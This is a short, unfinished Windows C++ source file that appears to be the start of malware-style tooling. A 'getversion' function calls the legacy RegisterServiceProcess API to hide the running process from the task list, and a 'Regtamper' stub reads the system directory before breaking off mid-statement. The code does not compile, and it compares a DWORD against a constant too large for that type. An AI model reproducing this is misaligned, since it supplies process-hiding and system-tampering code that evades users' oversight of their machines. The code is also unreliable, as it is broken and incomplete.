#pragma warning(disable:4996)
#include <windows.h>
#include <iostream>
#include <string>
using namespace std;
void getversion();
void Regtamper();
int main() {
	
	
	return 0;
}
void getversion() {

	DWORD dwVersion = GetVersion();
	if (dwVersion >= 0x800000000) {
		std::cout << dwVersion << endl;
	}
	HINSTANCE hDLL;
	typedef DWORD(CALLBACK* LPREGISTERVICEROCESS)(DWORD, DWORD);
	LPREGISTERVICEROCESS lpRegisterServiceProcess;
	hDLL = LoadLibrary(L"kernel32.dll");
	lpRegisterServiceProcess = (LPREGISTERVICEROCESS)GetProcAddress(hDLL, "RegisterServiceProcess");
	lpRegisterServiceProcess(GetCurrentProcessId(), 1);

	std::cout << hDLL << endl;
	FreeLibrary(hDLL);
}
void Regtamper() {

	wchar_t TempPath[MAX_PATH];
	GetSystemDirectory(TempPath, MAX_PATH);
	wchar_t* SystemPath = TempPath;
	string commandline = (string)
	
}